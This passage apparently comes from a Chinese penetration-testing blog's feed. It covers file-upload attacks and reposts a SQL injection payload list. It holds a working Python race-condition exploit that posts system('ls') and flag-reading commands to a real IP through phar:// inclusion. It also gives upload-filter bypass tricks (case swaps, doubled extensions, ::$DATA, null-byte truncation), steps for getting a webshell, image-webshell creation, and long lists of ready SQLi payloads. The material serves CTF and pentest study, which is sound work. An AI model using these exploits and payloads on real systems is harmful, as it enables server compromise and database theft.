<span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                        <span class=\"token function\">imagejpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image/gif'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                    <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imagecreatefromgif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                      <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatetruecolor</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                      <span class=\"token variable\">$bg</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                      <span class=\"token variable\">$text_color</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecolorallocate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                      <span class=\"token function\">imagefilledrectangle</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$bg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                      <span class=\"token function\">imagestring</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Error loading image\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_color</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                        <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                        <span class=\"token variable\">$new_rootpath</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token variable\">$name1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                        <span class=\"token function\">imagegif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$new_rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rootpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"图片ID：\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ERROR\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg () 返回图像资源，文件名更换为新的时间戳，用新的文件路径 newrootpath 输 出 图 片 ， 最 后 删 除 原文件 unlink (new_rootpath) 输出图片，最后删除原文件 unlink; 如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件 unlink ($rootpath); 上传过程中存在一个延时函数 sleep (5)，所以上传的文件即使验证不成功也有 5 秒钟的时间存在。</p>\n<p>python 的 payload。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>data0<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"phpinfo();\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data1<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('ls');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>data2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">'v'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat xxxxxxxxxasdasf_flag.php');\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token operator\">-</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token operator\">+</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        url <span class=\"token operator\">=</span> <span class=\"token string\">'http://202.112.51.184:9005/index.php?page=phar://./uploads/'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.jpg/v'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        t<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">print</span> i</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">print</span> t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"其它方式绕过\"><a class=\"anchor\" href=\"#其它方式绕过\">#</a> 其它方式 — 绕过</h2>\n<h3 id=\"原理-5\"><a class=\"anchor\" href=\"#原理-5\">#</a> 原理</h3>\n<p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p>\n<h3 id=\"绕过方法-8\"><a class=\"anchor\" href=\"#绕过方法-8\">#</a> 绕过方法</h3>\n<pre><code class=\"language-txt\">1. 后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； \n例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】\n\n2. 双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如&quot;php&quot;字符串过滤的； \n例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，\n开头的’p’和结尾的’hp’就组合又形成了【php】。\n\n3. 特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； \n例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。\n</code></pre>\n<h1 id=\"常见web-server组合\"><a class=\"anchor\" href=\"#常见web-server组合\">#</a> 常见 web server 组合</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>x.asp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>windows server + asp + access  +  IIS</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>x.aspx</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>windows server + aspx + sql server  +  IIS</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>x.php</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Linux  + apache + php  + mysql </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>linux +  ngix  + php  + mysql </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>x.jsp  x.jspx</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Linux + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>windows server  + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr></table></figure><h1 id=\"文件上传检测流程\"><a class=\"anchor\" href=\"#文件上传检测流程\">#</a> 文件上传检测流程</h1>\n<h2 id=\"脑图-by-zksmile\"><a class=\"anchor\" href=\"#脑图-by-zksmile\">#</a> 脑图 【by zksmile】</h2>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h2>\n<ol>\n<li>\n<p>寻找上传点网站前台的上传点一般有头像上传、附件上传、证件认证上传。如果通过 SQL 注入或者其它一些技术手段得到网站后台权限，一般在网站更新页面的地方会存在上传点。也可以通过敏感目录或文件扫描工具扫到一些开源编辑器的测试上传页面等等。</p>\n</li>\n<li>\n<p>找到上传点之后，先上传一张正常的图片测试该上传点时候可用。</p>\n</li>\n<li>\n<p>上传一张正常的图片，抓包修改文件后缀名为对应网站脚本语言。<br />\n该操作可以绕过前端检测、MIME 检测、文件内容检测，可以检测出网站是否对上传文件进行了文件后缀名的检测。<br />\n如果上传成功表示没有对文件后缀进行检测，可以进一步上传图片马，抓包修改文件后缀为对应网站脚本语言即可获取 webshell.<br />\n 如果上传失败表示对文件名后缀进行了检测，需要进一步判断是黑名单检测还是白名单检测。</p>\n</li>\n<li>\n<p>上传一张正常的图片，在它后缀随便添加几个字符进行上传。<br />\neg: &quot;1jpgaaaaa&quot; 该后缀的文件既不在黑名单之内也不在白名单之内，如果文件上传成功代表是黑名单检测，如果上传失败代表是白名单检测。</p>\n</li>\n<li>\n<p>黑名单检测绕过</p>\n<ul>\n<li>文件名大小写绕过</li>\n<li>特殊文件名绕过<br />\n后缀加上：\n<ul>\n<li>::$DATA（目标环境在 Windows 下）</li>\n<li>空格和点 (.)，或空格和点的组合（目标环境在 Windows 下）<br />\n碰到过滤文件名的</li>\n<li>双写文件名 pphphp</li>\n</ul>\n</li>\n<li>0x00 截断绕过</li>\n<li>.htaccess 文件攻击</li>\n<li>php 文件包含漏洞</li>\n<li>Apache 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n<li>\n<p>白名单检测绕过</p>\n<ul>\n<li>0x00 截断绕过</li>\n<li>是否暴露保存路径，保存路径截断，或修改</li>\n<li>php 文件包含漏洞</li>\n<li>IIS 解析漏洞</li>\n<li>Nginx 解析漏洞</li>\n</ul>\n</li>\n</ol>\n<p>图片马制作</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>copy <span class=\"token number\">1</span>.png/b + payload.* <span class=\"token number\">2</span>.png</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/A           表示 ASCII 文本文件。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/B           表示二进制文件。</pre></td></tr></table></figure>",
            "tags": [
                "文件上传"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/",
            "title": "SQL-injection-payload-list【转】",
            "date_published": "2020-12-30T09:38:30.000Z",
            "content_html": "<h1 id=\"sql-injection-payload-list\"><a class=\"anchor\" href=\"#sql-injection-payload-list\">#</a> SQL Injection Payload List</h1>\n<p>源地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">https://github.com/payloadbox/sql-injection-payload-list</span></p>\n<h2 id=\"sql-injection\"><a class=\"anchor\" href=\"#sql-injection\">#</a> SQL Injection</h2>\n<p>In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>\n<h2 id=\"what-is-sql-injection-sqli\"><a class=\"anchor\" href=\"#what-is-sql-injection-sqli\">#</a> What is SQL injection (SQLi)?</h2>\n<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p>\n<p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>\n<table>\n<thead>\n<tr>\n<th>SQL Injection Type</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>In-band SQLi (Classic SQLi)</td>\n<td>In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.</td>\n</tr>\n<tr>\n<td>Error-based SQLi</td>\n<td>Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.</td>\n</tr>\n<tr>\n<td>Union-based SQLi</td>\n<td>Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.</td>\n</tr>\n<tr>\n<td>Inferential SQLi (Blind SQLi)</td>\n<td>Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.</td>\n</tr>\n<tr>\n<td>Boolean-based (content-based) Blind SQLi</td>\n<td>Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Time-based Blind SQLi</td>\n<td>Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>\n</tr>\n<tr>\n<td>Out-of-band SQLi</td>\n<td>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).</td>\n</tr>\n<tr>\n<td>Voice Based Sql Injection</td>\n<td>It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"sql-injection-vulnerability-scanner-tools\"><a class=\"anchor\" href=\"#sql-injection-vulnerability-scanner-tools\">#</a> SQL Injection Vulnerability Scanner Tool's :</h2>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">SQLMap</span> – Automatic SQL Injection And Database Takeover Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==\">jSQL Injection</span> – Java Tool For Automatic SQL Database Injection</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=\">BBQSQL</span> – A Blind SQL-Injection Exploitation Tool</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=\">NoSQLMap</span> – Automated NoSQL Database Pwnage</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=\">Whitewidow</span> – SQL Vulnerability Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=\">DSSS</span> – Damn Small SQLi Scanner</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==\">explo</span> – Human And Machine Readable Web Vulnerability Testing Format</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n\">Blind-Sql-Bitshifting</span> – Blind SQL-Injection via Bitshifting</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu\">Leviathan</span> – Wide Range Mass Audit Toolkit</p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5\">Blisqy</span> – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)</p>\n</li>\n</ul>\n<h2 id=\"generic-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-sql-injection-payloads\">#</a> Generic SQL Injection Payloads</h2>\n<pre><code>'\n''\n`\n``\n,\n&quot;\n&quot;&quot;\n/\n//\n\\\n\\\\\n;\n' or &quot;\n-- or # \n' OR '1\n' OR 1 -- -\n&quot; OR &quot;&quot; = &quot;\n&quot; OR 1 = 1 -- -\n' OR '' = '\n'='\n'LIKE'\n'=0--+\n OR 1=1\n' OR 'x'='x\n' AND id IS NULL; --\n'''''''''''''UNION SELECT '2\n%00\n/*…*/ \n+\t\taddition, concatenate (or space in url)\n||\t\t(double pipe) concatenate\n%\t\twildcard attribute indicator\n\n@variable\tlocal variable\n@@variable\tglobal variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+\n\n1' ORDER BY 1,2--+\n1' ORDER BY 1,2,3--+\n\n1' GROUP BY 1,2,--+\n1' GROUP BY 1,2,3--+\n' GROUP BY columnnames having 1=1 --\n\n\n-1' UNION SELECT 1,2,3--+\n' UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) = 1\t\n\n' AND MID(VERSION(),1,1) = '5';\n\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n';WAITFOR DELAY '0:0:30'--\n\nComments:\n\n#\t    Hash comment\n/*  \tC-style comment\n-- -\tSQL comment\n;%00\tNullbyte\n`\t    Backtick\n</code></pre>\n<h2 id=\"generic-error-based-payloads\"><a class=\"anchor\" href=\"#generic-error-based-payloads\">#</a> Generic Error Based Payloads</h2>\n<pre><code> OR 1=1\n OR 1=0\n OR x=x\n OR x=y\n OR 1=1#\n OR 1=0#\n OR x=x#\n OR x=y#\n OR 1=1-- \n OR 1=0-- \n OR x=x-- \n OR x=y-- \n OR 3409=3409 AND ('pytW' LIKE 'pytW\n OR 3409=3409 AND ('pytW' LIKE 'pytY\n HAVING 1=1\n HAVING 1=0\n HAVING 1=1#\n HAVING 1=0#\n HAVING 1=1-- \n HAVING 1=0-- \n AND 1=1\n AND 1=0\n AND 1=1-- \n AND 1=0-- \n AND 1=1#\n AND 1=0#\n AND 1=1 AND '%'='\n AND 1=0 AND '%'='\n AND 1083=1083 AND (1427=1427\n AND 7506=9091 AND (5913=5913\n AND 1083=1083 AND ('1427=1427\n AND 7506=9091 AND ('5913=5913\n AND 7300=7300 AND 'pKlZ'='pKlZ\n AND 7300=7300 AND 'pKlZ'='pKlY\n AND 7300=7300 AND ('pKlZ'='pKlZ\n AND 7300=7300 AND ('pKlZ'='pKlY\n AS INJECTX WHERE 1=1 AND 1=1\n AS INJECTX WHERE 1=1 AND 1=0\n AS INJECTX WHERE 1=1 AND 1=1#\n AS INJECTX WHERE 1=1 AND 1=0#\n AS INJECTX WHERE 1=1 AND 1=1--\n AS INJECTX WHERE 1=1 AND 1=0--\n WHERE 1=1 AND 1=1\n WHERE 1=1 AND 1=0\n WHERE 1=1 AND 1=1#\n WHERE 1=1 AND 1=0#\n WHERE 1=1 AND 1=1--\n WHERE 1=1 AND 1=0--\n ORDER BY 1-- \n ORDER BY 2-- \n ORDER BY 3-- \n ORDER BY 4-- \n ORDER BY 5-- \n ORDER BY 6-- \n ORDER BY 7-- \n ORDER BY 8-- \n ORDER BY 9-- \n ORDER BY 10-- \n ORDER BY 11-- \n ORDER BY 12-- \n ORDER BY 13-- \n ORDER BY 14-- \n ORDER BY 15-- \n ORDER BY 16-- \n ORDER BY 17-- \n ORDER BY 18-- \n ORDER BY 19-- \n ORDER BY 20-- \n ORDER BY 21-- \n ORDER BY 22-- \n ORDER BY 23-- \n ORDER BY 24-- \n ORDER BY 25-- \n ORDER BY 26-- \n ORDER BY 27-- \n ORDER BY 28-- \n ORDER BY 29-- \n ORDER BY 30-- \n ORDER BY 31337-- \n ORDER BY 1# \n ORDER BY 2# \n ORDER BY 3# \n ORDER BY 4# 